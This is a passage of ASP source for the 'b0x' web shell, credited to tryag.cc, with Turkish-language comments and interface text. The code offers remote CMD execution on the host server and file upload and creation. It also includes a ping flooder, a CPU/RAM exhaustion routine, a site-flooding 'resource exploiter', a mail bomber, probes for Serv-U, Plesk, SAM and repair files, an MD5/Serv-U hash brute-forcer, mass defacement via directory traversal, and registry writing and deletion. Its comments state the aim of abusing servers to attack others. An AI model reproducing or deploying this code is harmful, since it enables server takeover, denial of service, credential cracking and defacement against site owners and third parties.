CASE 24 ' Klasör işlermleri için Upload - Dosya ayarat - klaösr yarat FORM ları by b0x
on error resume next  
...
response.write "</script>"
response.write "</td></tr></table></center>"
response.write "<br><center><table align=""center"" width=""100%"" class=""kbrtm""><form name=""dosycrete"" action='"&FilePath&"?mode=26&Path="&Path&"&Time="&time&"' method=""post""><tr><td align=""center"">Klasör Oluştur : <input name=""file"" value=""b0x"" type=""text""> <input name=""git"" value="" Oluştur "" type=""Submit""></td></tr></table></form></center>"
response.write "<center><table align=""center"" width=""100%"" class=""kbrtm""><form name=""filemaker"" action='"&FilePath&"?mode=27&Path="&Path&"&Time="&time&"' method=""post""><tr><td align=""center"">Dosya Adı : <input name=""file"" value=""b0x.asp"" type=""text""></td></tr><tr align=""center""><td><textarea style='width:100%;height:100;' name=""islem""></textarea></td></tr> <tr align=""center""><td><input name=""git"" value=""..:: Oluştur ::.."" type=""Submit""></td></tr></table></form></center>"
response.write "</td></tr></table>"
Call Status 

CASE 25 ' Upload işlemi by b0x
Upload()

CASE 26 ' Klasör yarat by b0x
...
CASE 28 ' CMD Formu ve işlem yeri  by b0x
...
response.write "</textarea>"
response.write "</td></tr></form><form name=""commmanderbyb0x2"" method=""Post"" action='"&FilePath&"?mode=28&Path="&Path&"'><tr><td><b>CMD Komut Calıştır: </b><input style='color=#DAFDD0' name=""inject4"" size='57' value='"&inject4&"' type='text'><input name='inject5' value='b0x' type='hidden'><input value="" .: Calıştır :. "" type='Submit'></td></tr>"
if inject5 = "b0x" then
on error resume next
tablo12("Komut Calıştırıldı. ")
end if
response.write "</form></table></center>"
response.write "<br><center><table align=""center"" width=""100%"" class=""kbrtm"">"
tablo12L("<font color=#FE7A84><b>NOT : </b> CMD komutları tamamen , Server üzerinde çalışmaktadır. Siz burda yazacagınız komut orda çalışıp, size geri dönecektir.")
tablo12L("<font color=#FE7A84><b>NOT : </b> <b>CMD Komut Listele</b> olayı, >dir, >netstat, >ping gibi geri DOS da geri bilgi döndüren komutlar kullanılır. AMA eger program çalışıtmrka, traojan yada Notepad gibi fonksiyonal ve applicaitonlı programlar, komutlarıda <b>CMD komut Calıştır</b>dan Uygulamanız gerekir.Aksi halde Sistem kısa süreli kitlenme yaşanır. CEvap alınamayabilinir.GEreginden fazla çalışıtrm yaparsnız , işlemcide Sizin Userinizin <b>RAM + CPU </b>kullnımı anormal artacaktır. </font>  <font color=#FE7A84 face=Wingdings size=5>N</font>")
yazorta("<a href='"&FilePath&"?mode=29&Path="&konu&"&Time="&time&"' onclick=""cmdhelp(this.href);return false;"">-->>  Kullanılabilir CMD komutlarından BAzıları   <<-- </a>")
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='center'><b>by b0x</b></td></tr></td></tr></table></center>"


CASE 29 ' CMD açıklama kısmı HELPER by b0x
response.write "<center>"
yazsol("<b>Attrib</b>: Attrib komutu dosyalara belli özellikleri verir veya kaldırır. c:\>attrib +r +a +s +h yazıp enter tuşuna basarsak.(help için : <b> ' attrib /?  ' </b>)")
yazsol("<b>Copy - xcopy</b> : Copy ve xcopy komutu ile istenilen dosya yada dosyaların başka yerlere kopyalanması işlemi gerçekleştirilir. Bilgi için bunu yazın :' <b>copy /? '</b>")
yazsol("<b>Net use</b> : Pc nin Paylaşım, Hesapları, ayarları, kullanıcıları... gibi özellliklere ulaşabilecegimiz ve degiştirebilecegimiz bir komut <b>NET</b> . Yarım dosyası için -> <b> net help </b> yazmanız yeterlidir.")
yazsol("<b>Netstat</b> : PC deki açık portları, ve dilediginiz port u dinleyebilirsiniz. <b>Netstat -a -b -e -n -o -r -s -v</b> gibi parametreler alır.")
yazsol("<b>Tracert</b> : Site, Ip, server ın nerde oldugunu tracert yapar. <b>tracert [-d] [-h maximum_hops] [-j host-list] [-w timeout] target_name</b> ")
yazsol("<b>IPCONFIG</b> : Server , PC nin IP bilgileirni, network bilgileirni veriyor. kulnım için - > <b>ipconfig help</b>  yazın yeterldir ")
yazorta("<b>by b0x</b>")
response.write "</center>"

CASE 30 ' PiNGer BY b0x - Server üzerinden sınırsız ping saldırrısı. =) ehehe by b0x
if not file = "1" then
...
yazsoll("  <font color=#C6FCBE> Not: Bunu kullanırken gireceginiz Paket boyutu önemlidir. Mümkünce aşırı büyük paket girmeyin, çünkü server yada site nereye saldırrıyorsanız, büyük paketleri filtreler ve cevap vermezler. O yüzden sürekli TimeOUT yazar. o yüzden yaa Boş bırakın yada 500 gibi normal bir seviye seçin.  <font color=#C6FCBE> <font face=Wingdings size=5>N</font> </font>  ")
yazsoll("<font color=#C6FCBE> Not: PiNG sayısını 98 dediniz mesela, Sistem bunu 10 hamlede yapacaktır. 10 arlı gönderektir. vede süreklisayfa kendini yenileyip, 98 olana kadar 10 ar 10 ar ping ee dewam edecektir. Burda TiMEout OLMA gibi sorunumuz yok. 100000 deseniz bile, o bitne kadar gece gündüze ping çekebilien sistem geliştirdim. Korkmadan, vede gece açık bırakarak sınırsız pingler çekebilirisniz.  <font color=#C6FCBE> <font face=Wingdings size=5>N</font></font> ")
yazsoll(" <font color=#FE7A84> Not: b0x, com.tr, gov.tr uzantılı sitelere karşı koruma aldım. Ping Attaker bu sitelere karşı Calıştıtılamaz, ve çalışıtırlsa bile Ping atmaz, size Uyarı verir. TUrk Siteleri Koruma ilk hedefimizdir. TUrk TUrk ? Vurmaz. by b0x <font color=#C6FCBE> <font face=Wingdings size=5>N</font></font> ")
yazsoll("<font color=#C6FCBE> <b>Ping Attack b0x</b> tarafından yazılmış olup, biraz hayal gücü, biraz çaba azimle, şu an kulanıdıgnız b0x yuda yazan olarak, bundaki amacım Server ın ,sitenin kaynaklarını sömürmek vede onun üzerinden onun kaynaklarını kullanrak başka yerlerede zarar , saldırı yapam güdenmiştir. BUndada BUnlaa başladım. <b>TUM hakları b0x e aittir.</b> <font color=#C6FCBE> <font color=#C6FCBE> <font face=Wingdings size=5>N</font></font>  ")
else
...
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td><font color=#C6FCBE>  Server ın CPu ve RAm kaynaklarını 1 dk içinde tüketebilen bir b0x eseridir. Bununla sadece, 3 tür program sürekli açılır ve kapatılmaz(Paint, Notepad, Explorer) Server en fazla 1 dk içinde Ram&Cpu sorunu ve kitlenmeler, cevap vermemeler, Status t resetlenme ilede sonuçlanabilir.</font></td></tr></table>"
yazorta(" <a href='"&FilePath&"?mode=31&file=1'>..::  RAM & CPU Attacker ı CALIşTIR .. by b0x  ::..</a> ")
response.write "</td></tr></table></center>"
else
Call Ram_Cpu
end if
...
CASE 32 ' Site kaynak Sömürücü by b0x =)
if not islem = "1" then
response.write "<center><table align=""center"" width=""100%""><tr><td>"
yazorta("<b> Site Kaynak Sömürücü 1.0 by b0x </b>")
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td><form name=""sitefuckerbyb0x"" method='post' action='"&FilePath&"?mode=32'>Site Adresi : <input name='url' value='http://www.siteadi.com' style='color=#C6FCBE' size=55 type='text'></td></tr><tr><td> Robot Sayısı : <input name='file' style='color=#C6FCBE' type='text' value='50' size=30> <input name='islem' type='hidden' value='1'><input name='gooo' value=' ..:: Sömür ::..' type='Submit'></td></tr></form></table>"
yazsol("Belirttigiz kadar Robot kadar baglanır ve siteyi sömürür. Ayrıca Saldırı sürekli kendini güceller, yeniler. Sonsuzdur. =) Robot u Baglantınıza göre ayarlayın. Mesela; Robot u 50 yaparsanız.O sayfa içinde 50 tane ayn? anda açılacak site ve indirecektir siteleri. ve o sırada sürekli siz, dosya indiroyr geçiçi olarak. VE bu olay her 30 snde güncelleniyor Otomatik. Birkez çalışıtr Ömür boyu kapatmazsan penceryi çalışır bir MAkina.")
yazsol("Site kodlarını, BAndwith ini ve ASP kitlenmesi yada SQL sömürmede, ressim, text sömürmede UStüne yoktur..")
yazorta("TUm hakları Saklıdır by b0x =)")
response.write "</td></tr></table></center>"
else
on error resume next
yazorta("<b> Site Kaynak Sömücü 1.0 by b0x =) 1.0 </b>")
yazorta("Sömürme MEkanizması Devrede...")
yazsol("Durdurmak için Pencereyi kapat. "&file&" Kadar baglanıp 30 sn da günceliyor saldırıyı...")
yazorta("<b>by b0x</b>")
...
if MailKorumasi(file) = 0 then
    ...
    if CInt(inject1) + 9 < CInt(count) then
        ...
        yazortaa(" Mail Bomber by b0x 1.0 i?lemini tamamladı...  ")
    else
        yazortaa(" <b>"&inject1&"/"&count&"</b> tane Mail Gönderildi... ")  
        yazortaa(" Mail Bomber by b0x 1.0 işlemini tamamladı...  ")
    end if
    end if
else
response.write "<br><br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align=""center"" > <font color=#FE7A84> <font  face=Wingdings size=5>N</font> BOMB yapılamadı. Tasvip etmedigimiz Bir mail e Saldırdıgınız için. by b0x !!!! <font color=#FE7A84> <font  face=Wingdings size=5>N</font> </font> </td></tr></table>"
end if
else
...
CASE 34 ' MSSQL - MYSQL Baglantı Formu Developed By b0x
if not islem = "1" then
Call MSSQL_Form
yazortaa(" Egerki, Sitelerin MSSQL bilgilerini biliyorsanız, bununla çok kolay baglanabilir.. ")
yazortaa(" Tabloları görebilir, üzerinde SQL komut çalıştırabilir, verileri okuyaiblirisniz ")
yazortaa(" Cok saglam ve güçlü bir MSSQL Manager hizmeti Saglar size...")
yazortaa(" <b>by b0x :)</b>")
else
Call SQL_menu_by_b0x
Call Tablolama
...
yazorta("<b>Biz Ne yaptık / What We Do?</b>")
yazsol("Biz bir b0x & MSWCTools & XMLHTTP Compenent lerini kullanarak Server a site üzerinden HTTP protocolunden erişim saglandıgında, Size Server ın tüm imkanlarından yararlanmanız için, Permission, şifre, gizli tüm içeriklere direk ulaşma, yada açma gibi özelikleri olan. Server ı çökertmeye , hatta kaynaklarını son damlasına kullanabilen tryag.cc adına hizmet veren Bir Canavar yarattık.")
yazorta("<b>Adı ? Name ?</b>")
yazsol("Bu yazılım b0x yazılımıdır. Bunun adı <b>a</b>b0x <b></b>F<b>SO</b> dur. oda kısaca -> <b>b0x'dur</b>")
yazorta("<b>Biz Kimiz / Who We Are?</b>")
yazsol("<b><a href=""mailto:By_ejder@outlook.com"">b0x</a> : Sitemiz <a href=""http://tryag.cc"" target=_blank"">http://tryag.cc</a></b>")
olmadi("<b>..:: TAKLiTLERiNDEN SAKININ !!! ::..</b>")

CASE 36 ' SQL komut YArdım kılavuzu by b0x
yazorta("<b>SQL Komut Yardım Merkezi by b0x :) </b>")
yazsoll("<b>SELECT</b> - Seçme&listeleme")
yazsol("Select * from TABLEADI<br> Select * from TABLEADI where SUTUNADI = DEĞER <br> Select * from tblAdmin where ID = 1")
...
yazsol("Update TABLOADI set stunadı = 'değeri' where Stunadı = değeri <br> Update tblAdmin set Name = 'b0x' where ID = 1")
yazsoll("<b>DELETE</b> - Deleting ")
yazsol("Delete TABLOADI where Stunadı = değeri<br>Delete tblAdmin where ID = 1")
...
CASE 37 ' Sistem Analizer Developed By b0x 
on error resume next
...
yazorta("<b>Server ın Bilgileri</b>")
yazsol("OS : <font color=#C6FCBE>"& OS() &"</font>")
yazsol("PC & Oturum Adı : <font color=#C6FCBE>\\"& b0xNet.ComputerName &"\"&b0xNet.UserName&"</font>")
...
yazorta("<b>Serverın Senden Algıladıkları</b>")
...
yazorta("<a href='"&FilePath&"?mode=38&Path="&Path&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">..:: Açıklama için Tıklayınız.. by b0x  ::..</a>")
response.write "</td></tr></table></center>"
...
yazorta(" <b>Server' in Paylaşıma Açık Klasörleri by b0x </b>")
...
yazorta("<b> Uzakdan Serv-U & GeneFtp & UsersTxT Erişimi SOnucu  by b0x </b>")
b0xServuRemote()
yazorta("<b>Gelişmiş Arama için</b>")
...
response.write "<br><center><table bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td>"
yazorta("<b> Uzakdan PLESK Erişimi SOnucu by b0x </b>")
b0xPleskRemote()
response.write "</td></tr></table></center>"
...
On error resume next
response.write "<br><center><table bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td>"
yazorta("<b> NTUser.Dat - Log - ini Erişim Sonucu by b0x </b>")
b0xaNTUser(struser)
response.write "</td></tr></table></center>"

On error resume next
response.write "<br><center><table bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td>"
yazorta("<b> Config Klasör Erişim Sonucu by b0x</b>")
b0xsam()
response.write "</td></tr></table></center>"
Call Status 
...
On error resume next
response.write "<br><center><table bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td>"
yazorta("<b> Repair Klasör Erişim Sonucu by b0x</b>")
b0xRepair()
response.write "</td></tr></table></center>"
Call Status 
...
yazsol("Windows Server lardaki, himeti sunan, IIS servisi, sizi AnonymousUserName ve o şifre ile tanır. Sizin yetkiniz o kullanıcıdadır. ")
yazsoll("IIS içinde ise, o siteninde BEllekdeki Oturum adıda -> WAMUserName adında ve şifresine sahiptir.")
yazsoll("Bu Sistem Geliştirilmeye Devam ediyor? ")
...
yazorta("<b> Kırmak istedigin Türü Seç</b>")
...
yazsol("<b>MD5 :</b> Bildiginiz üzere, bir çok sistemin kullandıgı bir şifreleme olayıdır. 128 bittir.")
yazsol("<b>Serv-U :</b> Server larda Host ların kullandıgı bir programdır. Kolay vede kullanışlı oldugu için Hostlar tarafındna tercih edilir. içinde Ftp şifreleri barındırmakdadır. burdada o şifreleri kırmaktadır.")
yazsoll("<font color=#C6FCBE >Bizde burda ASP tabanlı vede b0x içine injecte edip Sizlere Server ın CPU ve RAM ini kullanarak , Daha hızlı ve zahmetsiz, TimeOUT suz bir şekilde şifreleirni kırmanızı saglayacagız. Bu Kırma işlemi BRUTE attackl modelidir. Kısacası Kırma olasıgı eger ki sabreder ve şansınız varsa çok kısa sürede kırarsınız. Ama aksi halde 1 gün geçsede =) yinede %100 kırma garantisi vardır. Eger derleri dogru girerseniz.</font>")
yazortaa("Md5 & Serv-U KOd Converted by <b>Fastboy</b>")
Yazorta("Brute And HJACk Algorithms Written by <b>b0x</b>")

CASE 40 ' Md5 & Serv-U Algortitması Başlıyor Sıkı tutnun =) sakın dudagınız uçuklamaısn haa =) by b0x euheuh çok yordu be kafamı bu olay .. neyse çözdük yine =) eeheuh by b0x
...
yazsol("şifre Aralıgı :  <input style='color=#C6FCBE' size='5' name='ara1' value='5' type='text'>  ile  <input style='color=#C6FCBE' size='5' name='ara2' value='18' type='text'> aras?nda...")
...
yazorta("<input name='mode' value='41' type='hidden'><input name='md5kirgecirmahvetb0x' style='color=#C6FCBE' value='  __==  Kırmaya Başla  ==__ ' type=submit>")
response.write "</td></tr></form></table></center>"
if islem = " ..::  MD5  ::.. " then
yazsol("<b>MD5 Kodu Girin :</b> MD5 HASh şifrenizi giriniz oraya.. maksimum 10 Hash girebilirsiniz.")
else
yazsol("<b>Serv-u Ham Kodu Girin :</b> Serv-u Kodunun ilk 2 karakteri SALT dur. egri kalanı ise MD5 halidir. Oraya ilk 2 karakteri çıkarın ve geri kalanı yazın. altasa da SALT kısmınada, ilk 2 karakteri yazın. Max 10 Hash girebilirsiniz.")
end if
yazsol("<b>şifre Aralıgı :</b> Burda belirtilen aralıklar arasında şifre üretip, denemeye başlıcaktır. önce küçükden baglayıp, tüm charset denemsini yaptıkdan sonra, aralık bir artacaktır, taaki sizin üst sınıra kadar girdiginiz.")
yazsol("<b>CharSet i se?iniz; </b> şifre denerkenki, şifre karakterleridir. Büyük küçük harf önemlidir. Birden FAzla da seçebilriisniz. Ama unutmayınki, Deneme sayısı büyüdükçe, Zamanda ARTACAKTIR. ")
yazsol("<b>Bekleme Süresi :</b> Sürekli md5 deneme yaparsa sistem, büyük bir oranda Cpu kullanır. Cpu kullan?m? rahatlatmak için vede timeout u önlemek için , her bir Charset uzunlugu kadar deneyip, sonra yenileme yapıyor. o sıradaki bekleme süresidir bu.")
yazsol("<b>NOT :</b> Toplu Md5&ServU kırmak mümkün. Hepsini birden kullandıgınızda verim artacaktır. HIZ da düşüş olmaz. Ama sizin Daha kolay kırmanızı saglar, Coklu kırma.")
...
if inject4 = inject3 then
    response.write ("<script>alert(""Mükemmel Tüm şifreler Kırıldı ;) by b0x "")</script>")
    response.end()
end if
...
CASE 42 'MSWC nesnesi kullanımı. Permision geçme adına attığım bir adamdır. bu nesnenin olduğunu "Scorlex" den edindim. Araştırdım neler yaparım diye =) işte görün neler yapılabiliyormuşuz ;) bununla. uehueh by b0x
response.write "<table width=""100%"" class=""kbrtm""><tr valign=""top""><td colspan=""2"" align=""center"">"
tablo30("<b>Hacking with Using MSWCTools 1.0 Developed By b0x</b>")
yazsol("<form action='"&FilePath&"?mode=43' method=post><b>index Yeri : </b><input name='hash2' type='text' value='"&FilePath&"' size=50> (indexin Serverdaki virtual yeri)")
yazsol("<input type=radio name='hash4' checked value='tek'> <b>Atılacak Yer: </b><input name='hash3' type='text' value='default.asp' size=50> (Tek bir yere Yaz.)")
yazsol("<input type=radio name='hash4' value='multi'> <b>MASS Path: </b><input name='hash6' type='text' value='.\' size=50> (Mass yapılacak dizin)")
yazsol("<b>Eklencek Klasör: </b><input name='hash5' type='text' value='httpdocs\' size=25> (Ek Klasör girdisi -  BOş bırakın , bilmiyorsanız)")
yazorta("<input name='Gönder_Ej_De_r' value='Yazdır koçumm ;) by b0x' type='submit'")
response.write "</td></tr></table></form>"
yazorta("<b>Kullanımı by b0x</b>")
...
yazsol("<b>index yeri -></b>Burayı fiziksel yeri YAZMAYIN SAKIN. oraya indexinizin virtual yerini yani. Kullandığınız FSO dizinine olan KONUMUNU yazın indexin yani. Bu fso ile aynı yerde ise, 'hacked.html' eğer alt klasörde ise -> '..\hacking.html', '..\..\..\savsak\www\hacking.html',yada \news\hacking.html gibi belirtmeniz gerek.Konumunu böyle belirlemeniz gerekiyor. 'C:\ss\ss\hacking.html' yaptığınızda işlem gerçekleşmezz.. <b>YADA size ÖNERİm -> kullandığınız FSo yu istediğinzi yere server daki bir başkas siteye copyalatırrısanız , , bu sefer fso yu o site üzeridnen çalıştırrırsanız PErmsion ı aşmış olursunuz o site için.</b>")
yazsol("<b>Atılacak yer ->></b> TEK bir hedef için. Burayıda ..\..\ şeklinde inerek belirtmeniz gerekiyor.mesela '..\..\..\index.asp' 3 dizin aşağıya iner ve index i atar yada '..\..\..\www\index.asp'  3 dizin iner ww dizine girer , index i atar. =) böyle OLAMAK zorunda .  ")
yazsol("<b>MASS Konum  ->></b> BUrda çoklu alt klasörlerede index atmak için geliştirdim. '..\..\..\' şeklinde aşağılara inin ve TÜM sietelerin LİStelendiği klasör ee kadar olan '..\' işaretini ayarlayın. mesela 3 dizin aşağıda ise FSO olan uzaklığı, '..\..\..\'  yazın yeterdir =) . <b>Eklenecek klasör-></b> burda da, TÜm sietlere giriş yapıldıkdan sonraki Klasör adı , mesela 'www' yada 'http' yada 'wwwroot'  gibi.")
...
if err <> 0 then
    olmadi("MSWC.tools destegi yoktur bu serverın.")
end if
if hash4 = "tek" then
    on error resume next
...
For Each f1 In fc
    ...
    response.flush
Next
yazorta("<b>İşlem Tamamlandı. by ejder ;)</b>")
end if

CASE 44 'XMLHTTP lı dosya Reading  .
if inject2 = "ok" then
mevki = hash2
else
mevki = Fullpath
...
response.write "<table width=""100%"" class=""kbrtm""><tr valign=""top""><td colspan=""2"" align=""center"">"
tablo30("<b>Reading Files by using XMLHTTP 1.0 Developed By ejder </b>")
...
yazsol("<form action='"&FilePath&"?mode=45' method=post><input name='inject2' value='yaz' type='hidden'><b>Mevki/Key : </b><input name='hash2' type='text' value='' size=85><br> (örnek: HKLM\SOFTWARE\Microsoft\b0x.COM)")
...
response.write "</td></form></tr></table>"
yazsol("<table><tr><td>Root Key Name</td><td>Karşılığı</td></tr><tr><td>HKEY_CURRENT_USER</td><td>HKCU</td></tr><tr><td>HKEY_LOCAL_MACHINE</td><td> HKLM </td></tr><tr><td>HKEY_CLASSES_ROOT</td><td>HKCR</td></tr><tr><td>HKEY_USERS</td><td>HKEY_USERS </td></tr><tr><td>HKEY_CURRENT_CONFIG</td><td>HKEY_CURRENT_CONFIG </td></tr></table>")
yazsol("REG_SZ -> String(kelime) / REG_DWORD -> integer(Sayı) / REG_BINARY -> Binary / REG_EXPAND_SZ -> Multi String / REG_MULTI_SZ -> Aeeay String")
response.write "<table width=""100%"" class=""kbrtm""><tr valign=""top""><td colspan=""2"" align=""center"">"
tablo30("<br><b>Register lardan Reading   & SiL Coded Developed By TurkisH-RuleZ</b>")
yazsol("<form action='"&FilePath&"?mode=45' method=post><input name='inject2' value='oku' type='hidden'><b>Mevki/Key : </b><input name=""hash5"" type='text' value='' size=85><br> (örnek: HKLM\SOFTWARE\Microsoft\b0x_WAS_HERE)")
yazorta("<input value='oku' name='hash6' type='radio' checked> OKU  -  <input value='sil' name='hash6' type='radio'> SiL &nbsp;&nbsp;&nbsp;&nbsp;  <input name='SaVSA_K_CoM_' value='..:: OKU/SiL ::..' type='Submit'>")
response.write "</td></form></tr></table>"
on error resume next
Set SaVSaK = Server.CreateObject("WScript.Shell")
    if err <> 0 then
        olmadi("Server da WScript.SHell kullanımına İzin vermemektedir. İşlem başarısız")
        response.end()
    end if
if inject2 = "yaz" then
    on error resume next
    ...
    if err <> 0 then
        ...
        oldu(" <b>"+hash2+"</b><br> adresine register yazıldı. ")
    end if
    ...
    if hash6 = "oku" then
        ...
        on error resume next
        response.write "<center>Deger/Value: <b>"
...
yazortaa("<b>Coded by b0x - tryag.cc</b>")
END SELECT
...
Call SurucuInfo
yazortaa("<b>Coded by Alfso ... Developed By My System is Yours! But You're Still Not Here!")
yazorta("<center>www.tryag.cc")
yazorta("<center>Coding & Developedment & Algorithms Made by 020")
end if
%>